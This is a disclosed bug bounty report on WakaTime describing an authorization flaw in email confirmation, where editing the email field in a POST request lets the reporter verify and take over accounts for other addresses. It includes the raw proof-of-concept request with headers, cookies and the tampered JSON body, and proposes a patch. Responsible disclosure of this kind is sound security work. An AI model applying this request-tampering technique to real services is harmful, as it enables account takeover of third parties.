# IDOR create accounts and verify them with original account email

## Report Details
- **Report ID**: 244636
- **URL**: https://hackerone.com/reports/244636
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-06-30T05:02:09.962Z
- **Disclosed**: 2017-07-03T08:29:18.084Z

## Reporter
- **Username**: b3nac
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wakatime

## Vulnerability Information
Good evening,

#Vulnerability

I'm able to create accounts with the email verification that originates from the first account I created. After changing the confirm_email request body to a different email.. After I use that verification link that account is now under my control and bypasses authorization.

This is my confirm email link that created the account https://wakatime.com/confirm_email/5e22456d-9aae-4267-b1a9-4315c2605d89/█████.

#POC

Originally the post body was going to my main email connected to my Github account █████████  then I changed the post body attribute to ```{"email":"█████████"}```

POST REQUEST
```
Host: wakatime.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-CSRFToken: 66f16a9ab12e3778160492e8aa76f9fdf9ca7cf7
X-Requested-With: XMLHttpRequest
Referer: https://wakatime.com/settings/account
Content-Length: 33
Cookie: csrftoken=66f16a9ab12e3778160492e8aa76f9fdf9ca7cf7; session=███; _ga=GA1.2.1188274138.1498795408; _gid=GA1.2.603159014.1498795408; _hp2_ses_props.1557708959=%7B%22ts%22%3A1498795408426%2C%22d%22%3A%22wakatime.com%22%2C%22h%22%3A%22%2F%22%7D; _hp2_id.1557708959=%7B%22userId%22%3A826311878078087%2C%22pageviewId%22%3A%227630061189198761%22%2C%22sessionId%22%3A%221354552863608073%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%223.0%22%7D; wcsid=KSo0f96nmTUAWwVN5079D0W1D0Q0Q0eF; hblid=WdTG0SjK3Fun3PvE5079D0W1D0Q0QFe2; _oklv=1498797390713%2CKSo0f96nmTUAWwVN5079D0W1D0Q0Q0eF; _okdetect=%7B%22token%22%3A%2214987955065310%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22wakatime.com%22%7D; olfsk=olfsk45303583606993025; _ok=4159-757-10-7625; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1498797136273%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; remember_token=█████; _gat=1
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```
POST body:
```
{"email":"███████"}
```

Here's the screenshot of the request saying it was created █████.

And here's a screenshot of the newly created account ████.

#Patch

Only allow request to go out that match the originating account for verification.

This could lead to 3rd party account conflicts and takeovers. The alarming thing is that I can authorized outside emails from within my original account bypassing Oauth.

Please let me know if you have any questions.

## Attachments
No attachments
